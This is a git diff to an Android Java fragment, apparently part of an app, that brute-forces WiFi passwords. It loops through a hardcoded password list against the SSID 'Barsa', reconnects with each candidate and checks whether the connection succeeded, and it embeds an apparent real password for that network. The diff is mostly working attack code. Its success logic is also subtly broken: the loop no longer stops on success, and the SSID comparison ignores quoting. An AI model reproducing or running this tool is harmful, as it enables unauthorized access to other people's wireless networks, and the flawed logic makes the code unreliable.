@@ -6,6 +6,7 @@ import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 
+import LogFragment.LogFragment;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.fragment.app.Fragment;
@@ -15,15 +16,16 @@ import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.Button;
+import android.widget.TextView;
 
 import com.linkclink.gfr.R;
 
 public class BruteFragment extends Fragment {
 
-    private String networkSSID = "Barsa";
+    private String currentBruteSSID = "Barsa";
     private String networkPass = "brat22AA";
 
-    private String[] test = {"12345", "dsadsadsa", "brat22AA", "fsdfdfsfdssf"};
+    private String[] passwordTable = {"12345", "dsadsadsa", "brat22AA", "fsdfdfsfdssf"};
 
     int netId = 0;
 
@@ -42,7 +44,7 @@ public class BruteFragment extends Fragment {
 
     private int flagStartBrute;
 
-    String ssid;
+    private String ssid;
 
     public static BruteFragment newInstance() {
         return new BruteFragment();
@@ -75,42 +77,44 @@ public class BruteFragment extends Fragment {
     }
 
     private void Brute() {
+        ShowToast.showToast(getContext(),"Start brute wifi: " + currentBruteSSID);
 
 
-        for (int i = 0; i < test.length; i++) {
+        for (int i = 0; i < passwordTable.length; i++)
+        {
 
             /* Remove wifi */
             if (netId != 0) wifiManager.removeNetwork(netId);
 
+            /* Config */
             wifiConfiguration = new WifiConfiguration();
-            wifiConfiguration.SSID = String.format("\"%s\"", networkSSID);
-            wifiConfiguration.preSharedKey = String.format("\"%s\"", test[i]);
+            wifiConfiguration.SSID = String.format("\"%s\"", currentBruteSSID);
+            wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordTable[i]);
+            /*  */
 
             netId = wifiManager.addNetwork(wifiConfiguration);
-
 
             wifiManager.disconnect();
             wifiManager.enableNetwork(netId, true);
             wifiManager.reconnect();
 
-            Test();
-
-            if (ssid.equals(networkSSID))
-                break;
-
+            CheckSuccessConnect();
 
         }
-
-
     }
 
-    private void Test() {
+    private boolean CheckSuccessConnect() {
+
         // e.g. To check the Network Name or other info:
-        wifiManager = (WifiManager) getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);
         wifiInfo = wifiManager.getConnectionInfo();
+
         ssid = wifiInfo.getSSID();
-        ShowToast.showToast(getContext(), ssid);
+
+        if (currentBruteSSID.equals(ssid))
+        {
+            return true;
+        }
+
+        return false;
     }
-
-
 }
